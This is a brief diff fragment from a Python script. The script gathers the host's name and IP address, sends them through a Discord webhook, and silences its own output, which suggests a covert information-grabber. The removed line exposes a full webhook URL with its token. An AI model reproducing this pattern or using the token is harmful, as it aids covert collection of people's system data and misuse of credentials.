@@ -12,7 +12,7 @@ from dhooks import Webhook
 hostname = socket.gethostname()
 ip_address = socket.gethostbyname(hostname)
 
-webhook_url = "https://discord.com/api/webhooks/1277985827409887284/hwgu1bb-lbydDJGuEaatEaOkXX8e2lavR_vgnzJsZmkL1RL7d73CPJgdkrBQ-lbcmSFs"
+webhook_url = "https://discord.com/api/webhooks/"
 hook = Webhook(webhook_url)
 
 sys.stdout = open(os.devnull, 'w')
